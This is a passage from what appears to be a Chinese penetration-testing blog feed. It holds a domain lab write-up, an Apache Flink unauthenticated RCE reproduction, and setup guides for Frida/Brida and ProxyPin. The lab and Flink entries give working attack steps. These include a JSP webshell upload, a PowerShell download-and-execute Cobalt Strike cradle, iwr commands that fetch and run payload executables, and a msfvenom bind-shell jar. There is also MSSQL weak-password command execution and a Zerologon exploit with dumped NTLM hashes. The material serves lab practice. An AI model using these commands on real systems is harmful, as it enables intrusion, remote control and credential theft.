src="/img/win%E4%B8%8A%E9%85%8D%E7%BD%AEbrida%E6%8F%92%E4%BB%B6/image-20250313164333406.png" alt="image-20250313164333406"></p><p>后面启动 <code>frida</code> 需要 <code>root</code> 权限，得先获取手机的 <code>root</code> 权限</p><p>su</p><p><img src="/img/win%E4%B8%8A%E9%85%8D%E7%BD%AEbrida%E6%8F%92%E4%BB%B6/image-20250313164425022.png" alt="image-20250313164425022"></p><p>然后运行 <code>frida</code></p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">./frida-<span class="hljs-keyword">server</span><span class="hljs-number">-16.6</span><span class="hljs-number">.6</span>-android-ar<br></code></pre></td></tr></table></figure><p><img src="/img/win%E4%B8%8A%E9%85%8D%E7%BD%AEbrida%E6%8F%92%E4%BB%B6/image-20250430143119168.png" alt="image-20250430143119168"></p><h6 id="是否安装成功："><a href="#是否安装成功：" class="headerlink" title="是否安装成功："></a>是否安装成功：</h6><p>运行了之后使用 <code>frida-ps -U</code> （-u查看USB设备进程）查看Android进程，如果有，则代表 <code>Frida</code> 已经连接成功。电脑环境配置完成</p><p><img src="/img/win%E4%B8%8A%E9%85%8D%E7%BD%AEbrida%E6%8F%92%E4%BB%B6/image-20250430101748714.png" alt="image-20250430101748714"></p><h2 id="BP配置"><a href="#BP配置" class="headerlink" title="BP配置"></a>BP配置</h2><p>1、填写python路径</p><p><code>C:\Users\灵越5510\AppData\Local\Programs\Python\Python311\python11.exe</code></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import sys<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(sys.executable)</span></span><br></code></pre></td></tr></table></figure><p><img src="/img/win%E4%B8%8A%E9%85%8D%E7%BD%AEbrida%E6%8F%92%E4%BB%B6/image-20250430141805171.png" alt="image-20250430141805171"></p><p><img src="/img/win%E4%B8%8A%E9%85%8D%E7%BD%AEbrida%E6%8F%92%E4%BB%B6/image-20250430141751667.png" alt="image-20250430141751667"></p><p>2、点击最右边按钮，找个文件夹，会生成一些文件</p><p><img src="/img/win%E4%B8%8A%E9%85%8D%E7%BD%AEbrida%E6%8F%92%E4%BB%B6/image-20250430104118078.png" alt="image-20250430104118078"></p><p>3、Application ID是指包名，com开头那种。使用<code>adb shell pm list packages</code>可以将包名全部列出来</p><p><img src="/img/win%E4%B8%8A%E9%85%8D%E7%BD%AEbrida%E6%8F%92%E4%BB%B6/image-20250430104623789.png" alt="image-20250430104623789"></p><p>PID是指数字</p><p><code>frida-ps -U -a</code>，将PID和Application ID列出</p><p><img src="/img/win%E4%B8%8A%E9%85%8D%E7%BD%AEbrida%E6%8F%92%E4%BB%B6/image-20250430104838061.png" alt="image-20250430104838061"></p><p>选择一个包名或者PID填入BP</p><p><img src="/img/win%E4%B8%8A%E9%85%8D%E7%BD%AEbrida%E6%8F%92%E4%BB%B6/image-20250430105110308.png" alt="image-20250430105110308"></p><p>4、我用USB连接的，选择USB</p><p><img src="/img/win%E4%B8%8A%E9%85%8D%E7%BD%AEbrida%E6%8F%92%E4%BB%B6/image-20250430105126642.png" alt="image-20250430105126642"></p><p>5、设备ID</p><p><img src="/img/win%E4%B8%8A%E9%85%8D%E7%BD%AEbrida%E6%8F%92%E4%BB%B6/image-20250430105321038.png" alt="image-20250430105321038"></p><p><img src="/img/win%E4%B8%8A%E9%85%8D%E7%BD%AEbrida%E6%8F%92%E4%BB%B6/image-20250430105251836.png" alt="image-20250430105251836"></p><p>6、点击start启动服务,绿色是正常启动。</p><p>当frida-serve运行起来时，Appliication status才会成running状态</p><p><img src="/img/win%E4%B8%8A%E9%85%8D%E7%BD%AEbrida%E6%8F%92%E4%BB%B6/image-20250430105644610.png" alt="image-20250430105644610"></p><p>到这全部环境配置完成，我还是很幸运的没有遇到网上那些报错问题。</p><p><img src="/img/win%E4%B8%8A%E9%85%8D%E7%BD%AEbrida%E6%8F%92%E4%BB%B6/image-20250605101929347.png" alt="image-20250605101929347"></p>]]></content>
    
    
    <categories>
      
      <category>APP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>brida</tag>
      
      <tag>bp插件</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域环境靶场-WP</title>
    <link href="/2025/08/27/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/"/>
    <url>/2025/08/27/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/</url>
    
    <content type="html"><![CDATA[<p>靶场环境大概是这样的<br><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250826172650282.png" alt="image-20250826172650282"></p><h4 id="外网主机上线"><a href="#外网主机上线" class="headerlink" title="外网主机上线"></a>外网主机上线</h4><p>注册一个用户，登录后台后，找到个人资料功能点，有一个上传文件的功能点，F12找到路径（<a href="https://blog.csdn.net/qq_42321190/article/details/139424041%E5%8F%82%E8%80%83%E7%9A%84%E8%BF%99%E4%B8%AA%EF%BC%89">https://blog.csdn.net/qq_42321190/article/details/139424041参考的这个）</a></p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250825162125004.png" alt="image-20250825162125004"><br>访问路径，进行上传文件操作</p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250825162237593.png" alt="image-20250825162237593"></p><p>数据包内容为大马</p><p><code>https://github.com/tennc/webshell/blob/master/www-7jyewu-cn/%E9%9D%9E%E5%B8%B8%E7%89%9B%E9%80%BC%E7%9A%84Jsp%E5%A4%A7%E9%A9%AC.jsp</code></p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250825162326767.png" alt="image-20250825162326767"><br>将数据包后缀名进行反复上传</p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250825162630701.png" alt="image-20250825162630701"></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">jpg</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">jsp</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">jpg</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">jsp</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">jpg</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">jsp</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">jpg</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">jsp</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">jpg</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">jsp</span><br></code></pre></td></tr></table></figure><p>复制返回路径</p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250825163218094.png" alt="image-20250825163218094"></p><p>寻找一下图片的路径，用BP抓包，抓不到浏览器访问的包，手动构造一下</p><p><code>10.10.0.123:8088/upload/20250825/tes_20250825103054099.jpg</code></p><p>修改后缀名为jsp，将后三位进行爆破</p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250825163417291.png" alt="image-20250825163417291"><br><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250825163444062.png" alt="image-20250825163444062"></p><p>找到上传成功的jsp</p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250825163555657.png" alt="image-20250825163555657"></p><p>访问</p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250825164153030.png" alt="image-20250825164153030"></p><p>CS设置监听</p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250825164253791.png" alt="image-20250825164253791"></p><p>生成攻击载荷</p><p><code>powershell.exe -nop -w hidden -c &quot;IEX ((new-objectnet.webclient).downloadstring(&#39;http://ip:端口/a&#39;))&quot;</code></p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250825164546890.png" alt="image-20250825164546890"></p><p>运行</p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250825163951078.png" alt="image-20250825163951078"></p><p>上线CS，并提升权限</p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250825163915994.png" alt="image-20250825163915994"></p><p>没有在域里</p><p><code>shell ping DC</code></p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250825164918282.png" alt="image-20250825164918282"></p><p>发现192.168.0.126&#x2F;24网段</p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250825165016042.png" alt="image-20250825165016042"></p><h5 id="CS联动msf"><a href="#CS联动msf" class="headerlink" title="CS联动msf"></a>CS联动msf</h5><p>CS创建监听</p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250825165533957.png" alt="image-20250825165533957"></p><p>msf</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/multi/handler<br><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_http</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lhost 0.0.0.0</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lport 48012</span><br></code></pre></td></tr></table></figure><p>CS执行</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">spawn msf <span class="hljs-regexp">//m</span>sf是监听器的名字<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/Snipaste_2025-08-27_09-43-51.png" alt="Snipaste_2025-08-27_09-43-51"></p><h4 id="不出网第二台主机上线"><a href="#不出网第二台主机上线" class="headerlink" title="不出网第二台主机上线"></a>不出网第二台主机上线</h4><h5 id="搭建代理，使用Stowaway工具"><a href="#搭建代理，使用Stowaway工具" class="headerlink" title="搭建代理，使用Stowaway工具"></a>搭建代理，使用Stowaway工具</h5><p>在服务器上运行</p><p><code>./linux_x64_admin -l 8000 -s 123</code></p><p>将文件上传到第一台主机192.168.0.126上</p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250825170131004.png" alt="image-20250825170131004"></p><p>运行</p><p><code>windows_x64_agent.exe -c 服务器ip:8000 -s 123 --reconnect 8</code></p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250825170248968.png" alt="image-20250825170248968"></p><p>然后创建隧道，我这报错是因为我已经创建了一个，让我把旧的停了</p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250825170556531.png" alt="image-20250825170556531"></p><p>Proxifier创建规则</p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250825171216966.png" alt="image-20250825171216966"></p><p>dddd进行扫描，扫描出mssql弱口令，sa&#x2F;admin123</p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250825170937622.png" alt="image-20250825170937622"></p><p>MDUT可以连接成功</p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250825171037848.png" alt="image-20250825171037848"><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250825171250783.png" alt="image-20250825171250783"></p><p>激活组件后，可以执行命令，依旧有两个网卡，还有一层</p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250825171118174.png" alt="image-20250825171118174"></p><h5 id="也可以使用msf的auxiliary-x2F-admin-x2F-mssql-x2F-mssql-exec"><a href="#也可以使用msf的auxiliary-x2F-admin-x2F-mssql-x2F-mssql-exec" class="headerlink" title="也可以使用msf的auxiliary&#x2F;admin&#x2F;mssql&#x2F;mssql_exec"></a>也可以使用msf的auxiliary&#x2F;admin&#x2F;mssql&#x2F;mssql_exec</h5><p>先添加路由</p><p><code>run autoroute -p</code></p><p><code>run post/multi/manage/autoroute</code></p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250825171517983.png" alt="image-20250825171517983"></p><p>设置&#x2F;mssql_exec各个参数</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gradle">msf exploit(windows<span class="hljs-regexp">/smb/</span>psexec) &gt; use auxiliary<span class="hljs-regexp">/admin/m</span>ssql/mssql_exec<br>msf auxiliary(admin<span class="hljs-regexp">/mssql/m</span>ssql_exec) &gt; set session <span class="hljs-number">6</span><br>msf auxiliary(admin<span class="hljs-regexp">/mssql/m</span>ssql_exec) &gt; set PASSWORD admin123<br>msf auxiliary(admin<span class="hljs-regexp">/mssql/m</span>ssql_exec) &gt; set username sa<br>msf auxiliary(admin<span class="hljs-regexp">/mssql/m</span>ssql_exec) &gt; set cmd <span class="hljs-string">&#x27;whoami&#x27;</span><br>msf auxiliary(admin<span class="hljs-regexp">/mssql/m</span>ssql_exec) &gt; set RHOST <span class="hljs-number">192.168</span>.<span class="hljs-number">0.128</span><br>msf auxiliary(admin<span class="hljs-regexp">/mssql/m</span>ssql_exec) &gt; <span class="hljs-keyword">options</span><br></code></pre></td></tr></table></figure><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250825171738995.png" alt="image-20250825171738995"></p><p>运行以后报错</p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250825171836082.png" alt="image-20250825171836082"></p><p>不知道什么原因，只能不设置session了</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">msf auxiliary(admin<span class="hljs-regexp">/mssql/m</span>ssql_exec) &gt; unset SESSION<br></code></pre></td></tr></table></figure><p>运行，又报错，报错原因是数据库名不对<br><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250825172022309.png" alt="image-20250825172022309"></p><p>想把数据库名清空，<code>set --clear DATABASE</code>，但还是报错</p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250825172120027.png" alt="image-20250825172120027"></p><p>最后使用系统默认库，master</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">msf auxiliary(<span class="hljs-keyword">admin</span>/mssql/mssql_exec) &gt;  <span class="hljs-keyword">set</span> <span class="hljs-keyword">DATABASE</span> master<br></code></pre></td></tr></table></figure><p>运行成功</p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250825172328879.png" alt="image-20250825172328879"></p><h5 id="中转上线第二台主机"><a href="#中转上线第二台主机" class="headerlink" title="中转上线第二台主机"></a>中转上线第二台主机</h5><p>新建一个监听</p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250826112043981.png" alt="image-20250826112043981"></p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250826112131259.png" alt="image-20250826112131259"></p><p>生成exe，在目标上执行就行了，但是第二台不出网没办法直接下载</p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250826112435143.png" alt="image-20250826112435143"></p><p>把exe上传到第一台主机上</p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250826112733882.png" alt="image-20250826112733882"></p><p>使用MDUT访问第一台，下载到第二台</p><p>这里尝试了curl、wget等，不是因为主机本身没有工具就是因为权限不够，权限不够最后选择了这个路径C:\Users\MSSQLSERVER</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">powershell -c &quot;iwr -Uri http://<span class="hljs-number">192.168.0.126</span>:<span class="hljs-number">8088</span>/upload/<span class="hljs-number">20250826</span>/be_x64.exe -OutFile C:\Users\MSSQLSERVER\be_x64.exe&quot;<br></code></pre></td></tr></table></figure><p>运行</p><p><code>C:\Users\MSSQLSERVER\be_x64.exe</code></p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250826113150356.png" alt="image-20250826113150356"></p><p>上线</p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250826113755421.png" alt="image-20250826113755421"></p><p>提权</p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250826141802087.png" alt="image-20250826141802087"></p><p>烂土豆运行whoami的结果是system</p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250826142019249.png" alt="image-20250826142019249"></p><p>那直接运行中转的exe文件，直接system权限上线CS</p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250826142107943.png" alt="image-20250826142107943"></p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250826142230412.png" alt="image-20250826142230412"></p><h4 id="不出网第三台主机上线"><a href="#不出网第三台主机上线" class="headerlink" title="不出网第三台主机上线"></a>不出网第三台主机上线</h4><p>存在域环境，并抓取了hash等（通过CS的psexec横向失败，希望有懂得大佬提点我一下感谢感谢）</p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250826143218437.png" alt="image-20250826143218437"></p><p>域内横向没成功，那搭建代理吧</p><h5 id="再搭建一层代理，为了访问到10-10-10-139"><a href="#再搭建一层代理，为了访问到10-10-10-139" class="headerlink" title="再搭建一层代理，为了访问到10.10.10.139"></a>再搭建一层代理，为了访问到10.10.10.139</h5><p>上传代理工具到10.10.10.136，还是通过刚刚的方式，要上传到&#x2F;upload&#x2F;20250826&#x2F;路径下，这个截图有问题</p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250826151812345.png" alt="image-20250826151812345"></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">powershell -c &quot;iwr -Uri http://<span class="hljs-number">192.168.0.126</span>:<span class="hljs-number">8088</span>/upload/<span class="hljs-number">20250826</span>/windows_x64_agent.exe -OutFile C:\Users\MSSQLSERVER\windows_x64_agent.exe&quot;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250826162652904.png" alt="image-20250826162652904"></p><p>在use 0上起一个监听，依次输入1和监听端口27850</p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250721152114990.png" alt="image-20250721152114990"></p><p>在10.10.10.136上执行命令</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">C</span>:\Users\MSSQLSERVER\windows_x64_agent.exe -c <span class="hljs-number">192.168.0.126:27850</span> -s <span class="hljs-number">123</span> --reconnect <span class="hljs-number">8</span> <br></code></pre></td></tr></table></figure><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250826152838683.png" alt="image-20250826152838683"></p><p>二层代理搭建完成</p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250826152937416.png" alt="image-20250826152937416"></p><p>在新加的代理上起一个socks隧道</p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250826153104434.png" alt="image-20250826153104434"></p><p>Proxifier上再添加一个规则</p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/Snipaste_2025-08-27_09-55-16.png" alt="image-20250826153211516"></p><p>然后我用dddd扫了一下，但是没有东西可以用</p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250826163244734.png" alt="image-20250826163244734"></p><p>在我的物理机上直接使用工具，工具地址 <code>https://github.com/StarfireLab/AutoZerologon</code></p><h5 id="上线第三台主机"><a href="#上线第三台主机" class="headerlink" title="上线第三台主机"></a>上线第三台主机</h5><p><code>python AutoZerologon.py 10.10.10.139 -scan</code></p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250826161935969.png" alt="image-20250826161935969"></p><p><code>python AutoZerologon.py 10.10.10.139 -exp -user domain_admins</code></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">Administrator:</span><span class="hljs-number">500</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">81220</span>c729f6ccb63d782a77007550f74:::<br><span class="hljs-symbol">Guest:</span><span class="hljs-number">501</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::<br><span class="hljs-symbol">krbtgt:</span><span class="hljs-number">502</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:b20eb34f01eaa5ac8b6f80986c765d6d</span>:::<br>sec123.cnk\<span class="hljs-symbol">cnk:</span><span class="hljs-number">1108</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">83717</span>c6c405937406f8e0a02a7215b16:::<br><span class="hljs-title class_">AD01</span><span class="hljs-variable">$:</span><span class="hljs-number">1001</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::<br><span class="hljs-title class_">SERVER2012</span><span class="hljs-variable">$:</span><span class="hljs-number">1109</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:fd62e356f4c597184b47bf7781fece12</span>::<span class="hljs-symbol">:</span><br></code></pre></td></tr></table></figure><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250826161903830.png" alt="image-20250826161903830"></p><p><code>python AutoZerologon.py 10.10.10.139 -shell</code></p><p><img src="/img/%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA-WP/image-20250826161810145.png" alt="image-20250826161810145"></p>]]></content>
    
    
    <categories>
      
      <category>靶场练习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>域环境</tag>
      
      <tag>三层网络</tag>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>proxypin使用</title>
    <link href="/2025/05/06/proxypin%E4%BD%BF%E7%94%A8/"/>
    <url>/2025/05/06/proxypin%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>使用proxypin工具</p><p><a href="https://github.com/wanghongenpin/proxypin">https://github.com/wanghongenpin/proxypin</a></p><h6 id="安装到手机上以后的操作"><a href="#安装到手机上以后的操作" class="headerlink" title="安装到手机上以后的操作"></a>安装到手机上以后的操作</h6><p>首页有一个应用白名单</p><img src="/img/proxypin使用/image-20250506150600858.png" alt="image-20250506150600858" style="zoom:50%;" /><p>默认不开启，点一下开启，添加软件，只抓某一个的数据包</p><img src="/img/proxypin使用/image-20250506151405876.png" alt="image-20250506151405876" style="zoom:50%;" /><p>我的-&gt;HTTPS代理-&gt;启用HTTPS代理</p><img src="/img/proxypin使用/image-20250506150200903.png" alt="image-20250506150200903" style="zoom: 33%;" /><p>点击安装根证书，将证书通过MT管理器传入到&#x2F;data&#x2F;adb&#x2F;modules&#x2F;MoveCertificate&#x2F;certficates&#x2F;路径下，权限由777改到644，重启手机</p><img src="/img/proxypin使用/image-20250416155351870.png" alt="image-20250416155351870" style="zoom: 67%;" /><img src="/img/proxypin使用/image-20250416155004433.png" alt="image-20250416155004433" style="zoom: 33%;" /><p>在设置中点击外部代理设置，默认是未启用的，需要开启，后配置局域网内<code>yakit</code>监听的IP端口</p><img src="/img/proxypin使用/image-20250416155535706.png" alt="image-20250416155535706" style="zoom:67%;" /><p><img src="/img/proxypin%E4%BD%BF%E7%94%A8/image-20250416155717621.png" alt="image-20250416155717621"></p>]]></content>
    
    
    <categories>
      
      <category>APP抓包</category>
      
    </categories>
    
    
    <tags>
      
      <tag>proxypin</tag>
      
      <tag>wx</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>apache-flink-unauth-rce-不出网上线msf</title>
    <link href="/2025/04/28/apache-flink-unauth-rce-%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BFmsf/"/>
    <url>/2025/04/28/apache-flink-unauth-rce-%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BFmsf/</url>
    
    <content type="html"><![CDATA[<h2 id="apache-flink-unauth-rce-不出网上线msf"><a href="#apache-flink-unauth-rce-不出网上线msf" class="headerlink" title="apache-flink-unauth-rce-不出网上线msf"></a><strong>apache-flink-unauth-rce</strong>-不出网上线msf</h2><p>直接未授权访问</p><p><img src="/img/apache-flink-unauth-rce-%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BFmsf/image-20250422114301788.png" alt="image-20250422114301788"></p><p>使用msf生成jar包</p><p>msfvenom -p java&#x2F;shell&#x2F;bind_tcp RHOST&#x3D;对方IP LPORT&#x3D;4654 -f jar &gt;hello.jar</p><p><img src="/img/apache-flink-unauth-rce-%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BFmsf/image-20250422114803060.png" alt="image-20250422114803060"></p><p>将jar包上传到Submit New Job功能点</p><p><img src="/img/apache-flink-unauth-rce-%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BFmsf/image-20250422114606956.png" alt="image-20250422114606956"></p><p>msf配置好监听</p><p><img src="/img/apache-flink-unauth-rce-%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BFmsf/image-20250422114853776.png" alt="image-20250422114853776"></p><p><img src="/img/apache-flink-unauth-rce-%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BFmsf/image-20250422114931707.png" alt="image-20250422114931707"></p><p>点击submit，我点了三次上线的，我着急，可能第一次就成功了。（页面会有报错信息出现，不知道为啥）</p><p><img src="/img/apache-flink-unauth-rce-%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BFmsf/image-20250422115001475.png" alt="image-20250422115001475"></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>apache-flink</tag>
      
      <tag>rce</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>weblogic_2020-2551</title>
    <link href="/2025/02/07/weblogic-2020-2551/"/>
    <url>/2025/02/07/weblogic-2020-2551/</url>
    
